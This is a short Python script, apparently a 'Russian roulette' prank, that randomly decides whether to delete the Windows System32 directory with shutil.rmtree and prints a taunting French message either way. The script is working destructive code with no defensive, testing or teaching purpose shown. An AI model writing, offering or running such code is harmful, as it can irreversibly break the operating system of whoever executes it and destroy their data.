#######################
#      i3vory         #
#    04/10/2021       #
#######################

import shutil
import random

pathTest = r"C:\Windows\System32"
nb = random.randint(0, 1)

if(nb == 1):
    shutil.rmtree(pathTest)
    print("Le fichier c'est ciao")

else: 
    print("t'as de la chance")
